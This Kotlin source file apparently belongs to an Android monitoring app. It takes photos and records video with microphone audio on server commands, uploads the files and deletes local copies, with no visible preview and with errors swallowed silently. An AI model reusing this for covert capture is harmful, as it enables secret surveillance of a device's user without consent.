package com.dilarion.app.monitoring

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.view.Surface
import com.dilarion.app.data.api.ApiService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.io.FileOutputStream
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine

class CameraCapture(
    private val context: Context,
    private val apiService: ApiService,
    private val scope: CoroutineScope,
    private val getToken: suspend () -> String?,
) {
    private val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
    private var handlerThread: HandlerThread? = null
    private var handler: Handler? = null

    private var videoRecorder: MediaRecorder? = null
    private var videoCamera: CameraDevice? = null
    private var videoCaptureSession: CameraCaptureSession? = null
    private var videoFile: File? = null

    @SuppressLint("MissingPermission")
    suspend fun takePhoto(useFront: Boolean, commandId: Int) {
        val cameraId = findCamera(useFront) ?: findCamera(!useFront) ?: return
        startThread()
        val imageReader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 1)
        var camera: CameraDevice? = null
        try {
            camera = openCamera(cameraId)
            val session = createSession(camera, listOf(imageReader.surface))
            val request = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                addTarget(imageReader.surface)
            }.build()

            val file = File(context.cacheDir, "photo_${System.currentTimeMillis()}.jpg")
            val imageCaptured = suspendCoroutine<Boolean> { cont ->
                imageReader.setOnImageAvailableListener({ reader ->
                    val image = reader.acquireLatestImage() ?: run { cont.resume(false); return@setOnImageAvailableListener }
                    val buffer = image.planes[0].buffer
                    val bytes = ByteArray(buffer.remaining())
                    buffer.get(bytes)
                    image.close()
                    FileOutputStream(file).use { it.write(bytes) }
                    cont.resume(true)
                }, handler)
                session.capture(request, null, handler)
            }

            session.close()
            if (imageCaptured) uploadPhoto(file, commandId)
        } catch (_: Exception) {
        } finally {
            imageReader.close()
            camera?.close()
            stopThread()
        }
    }

    @SuppressLint("MissingPermission")
    fun startVideoRecording(useFront: Boolean) {
        scope.launch {
            val cameraId = findCamera(useFront) ?: findCamera(!useFront) ?: return@launch
            startThread()
            val file = File(context.cacheDir, "video_${System.currentTimeMillis()}.mp4")
            videoFile = file
            val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                MediaRecorder(context) else @Suppress("DEPRECATION") MediaRecorder()
            recorder.apply {
                setVideoSource(MediaRecorder.VideoSource.SURFACE)
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setVideoSize(1280, 720)
                setVideoFrameRate(30)
                setOutputFile(file.absolutePath)
                prepare()
            }
            videoRecorder = recorder
            try {
                val camera = openCamera(cameraId)
                videoCamera = camera
                val surface = recorder.surface
                val session = createSession(camera, listOf(surface))
                videoCaptureSession = session
                val request = camera.createCaptureRequest(CameraDevice.TEMPLATE_RECORD).apply {
                    addTarget(surface)
                }.build()
                session.setRepeatingRequest(request, null, handler)
                recorder.start()
            } catch (e: Exception) {
                recorder.release()
                videoRecorder = null
                videoFile = null
                stopThread()
            }
        }
    }

    fun stopVideoRecording(onDone: (File) -> Unit) {
        try {
            videoCaptureSession?.close()
            videoRecorder?.stop()
            videoRecorder?.release()
        } catch (_: Exception) {}
        videoCamera?.close()
        videoCaptureSession = null
        videoRecorder = null
        videoCamera = null
        val f = videoFile
        videoFile = null
        stopThread()
        if (f != null) onDone(f)
    }

    suspend fun uploadPhoto(file: File, commandId: Int) {
        val token = getToken() ?: return
        runCatching {
            val part = MultipartBody.Part.createFormData(
                "file", "photo.jpg",
                file.asRequestBody("image/jpeg".toMediaType()),
            )
            apiService.uploadPhoto(
                "Bearer $token", part,
                commandId.toString().toRequestBody("text/plain".toMediaType()),
                "take_photo".toRequestBody("text/plain".toMediaType()),
            )
        }
        file.delete()
    }

    suspend fun uploadVideo(file: File) {
        val token = getToken() ?: return
        runCatching {
            val part = MultipartBody.Part.createFormData(
                "file", "video.mp4",
                file.asRequestBody("video/mp4".toMediaType()),
            )
            apiService.uploadVideoRecording(
                "Bearer $token", part,
                "video_recording".toRequestBody("text/plain".toMediaType()),
            )
        }
        file.delete()
    }

    private fun findCamera(front: Boolean): String? {
        return cameraManager.cameraIdList.firstOrNull { id ->
            val chars = cameraManager.getCameraCharacteristics(id)
            val facing = chars.get(CameraCharacteristics.LENS_FACING)
            if (front) facing == CameraCharacteristics.LENS_FACING_FRONT
            else facing == CameraCharacteristics.LENS_FACING_BACK
        }
    }

    @SuppressLint("MissingPermission")
    private suspend fun openCamera(cameraId: String): CameraDevice = suspendCoroutine { cont ->
        cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
            override fun onOpened(camera: CameraDevice) = cont.resume(camera)
            override fun onDisconnected(camera: CameraDevice) { camera.close() }
            override fun onError(camera: CameraDevice, error: Int) { camera.close() }
        }, handler)
    }

    private suspend fun createSession(
        camera: CameraDevice,
        surfaces: List<Surface>,
    ): CameraCaptureSession = suspendCoroutine { cont ->
        @Suppress("DEPRECATION")
        camera.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
            override fun onConfigured(session: CameraCaptureSession) = cont.resume(session)
            override fun onConfigureFailed(session: CameraCaptureSession) {}
        }, handler)
    }

    private fun startThread() {
        if (handlerThread?.isAlive == true) return
        val t = HandlerThread("CameraCapture").also { it.start() }
        handlerThread = t
        handler = Handler(t.looper)
    }

    private fun stopThread() {
        handlerThread?.quitSafely()
        handlerThread = null
        handler = null
    }
}
